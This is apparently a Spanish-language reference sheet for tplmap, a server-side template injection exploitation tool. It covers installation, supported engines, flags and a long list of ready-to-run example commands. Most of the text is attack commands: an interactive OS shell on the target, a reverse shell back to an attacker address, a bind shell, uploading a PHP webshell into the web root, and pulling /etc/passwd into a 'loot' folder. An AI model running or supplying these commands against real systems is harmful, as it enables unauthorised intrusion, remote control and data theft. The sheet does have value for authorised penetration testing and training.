# tplmap - Referencia

Explotador de Server-Side Template Injection (SSTI). Soporta 15+ motores de templates en Python, PHP, Java, Node.js y Ruby.

## Instalacion

```bash
# Original (Python 2)
git clone https://github.com/epinna/tplmap.git
cd tplmap && pip install -r requirements.txt

# Fork Python 3
git clone https://github.com/mattmasel/tplmap-python3.git
cd tplmap-python3 && pip3 install -r requirements.txt
```

## Motores Soportados

| Motor | Lenguaje | Tag |
|-------|----------|-----|
| Jinja2 | Python | `{{*}}` |
| Mako | Python | `${*}` |
| Tornado | Python | `{{*}}` |
| Cheetah | Python | `${*}` |
| Twig | PHP | `{{*}}` |
| Smarty | PHP | `{*}` |
| Freemarker | Java | `${*}` |
| Velocity | Java | `$*` |
| Pebble | Java | `{{*}}` |
| Jade/Pug | Node.js | `#{*}` |
| Nunjucks | Node.js | `{{*}}` |
| Dot | Node.js | `{{=*}}` |
| Marko | Node.js | `${*}` |
| ERB | Ruby | `<%= * %>` |
| Slim | Ruby | `= *` |

Tambien soporta **eval()-like code injections** en Python, Ruby, PHP, Java.

## Flags

### Target
| Flag | Descripcion |
|------|-------------|
| `-u URL` | URL objetivo con parametro inyectable (requerido) |

### Request
| Flag | Descripcion |
|------|-------------|
| `-d DATA` | POST data |
| `-X METHOD` | Metodo HTTP forzado |
| `-H HEADER` | Header extra (repetible) |
| `-c COOKIE` | Cookies (repetible) |
| `-A USER_AGENT` | User-Agent custom |
| `--proxy PROXY` | Proxy (ej: `http://127.0.0.1:8080`) |

### Deteccion
| Flag | Descripcion |
|------|-------------|
| `--level LEVEL` | Nivel de escape de contexto (1-5, default: 1) |
| `-e ENGINE` | Forzar motor especifico (jinja2, twig, mako, etc) |
| `-t TECHNIQUE` | Tecnica: R=Rendering, T=Time-based blind (default: RT) |

### Explotacion OS
| Flag | Descripcion |
|------|-------------|
| `--os-shell` | Shell interactivo en el target |
| `--os-cmd COMMAND` | Ejecutar comando unico |
| `--bind-shell PORT` | Bind shell en puerto del target |
| `--reverse-shell HOST PORT` | Reverse shell al atacante |
| `--upload LOCAL REMOTE` | Subir archivo local al target |
| `--download REMOTE LOCAL` | Descargar archivo del target |

### Explotacion Template
| Flag | Descripcion |
|------|-------------|
| `--tpl-shell` | Pseudo-shell en contexto del template engine |
| `--tpl-code CODE` | Ejecutar codigo del template engine |

## Ejemplos Practicos

```bash
# Test basico (auto-detectar motor)
./tplmap.py -u "http://target.com/page?name=John"

# POST parameter
./tplmap.py -u "http://target.com/submit" -d "name=John&comment=test"

# Forzar metodo POST
./tplmap.py -u "http://target.com/api" -X POST -d "template=test"

# OS shell en el target
./tplmap.py -u "http://target.com/page?name=John" --os-shell

# Comando unico
./tplmap.py -u "http://target.com/page?name=John" --os-cmd "id"

# Forzar motor especifico
./tplmap.py -u "http://target.com/page?name=John" -e jinja2
./tplmap.py -u "http://target.com/render?input=test" -e twig

# Con cookies
./tplmap.py -u "http://target.com/dashboard?tpl=test" -c "session=abc123; token=xyz"

# Con headers
./tplmap.py -u "http://target.com/api?input=test" -H "Authorization: Bearer eyJ..."

# Via proxy
./tplmap.py -u "http://target.com/page?name=test" --proxy http://127.0.0.1:8080

# Nivel de escape alto
./tplmap.py -u "http://target.com/page?name=test" --level 5

# Solo time-based blind
./tplmap.py -u "http://target.com/page?name=test" -t T

# Motor + nivel + tecnica
./tplmap.py -u "http://target.com/render?input=test" -e jade --level 5 -t RT

# Reverse shell
./tplmap.py -u "http://target.com/page?name=test" --reverse-shell 10.10.14.5 4444

# Bind shell
./tplmap.py -u "http://target.com/page?name=test" --bind-shell 4444

# Subir webshell
./tplmap.py -u "http://target.com/page?name=test" \
  --upload /local/shell.php /var/www/html/shell.php

# Descargar archivo
./tplmap.py -u "http://target.com/page?name=test" \
  --download /etc/passwd ./loot/passwd

# Shell en contexto del template
./tplmap.py -u "http://target.com/page?name=test" --tpl-shell

# Ejecutar codigo template
./tplmap.py -u "http://target.com/page?name=test" --tpl-code "7*7"

# Punto de inyeccion con wildcard (*)
./tplmap.py -u "http://target.com/page?name=John*"
```
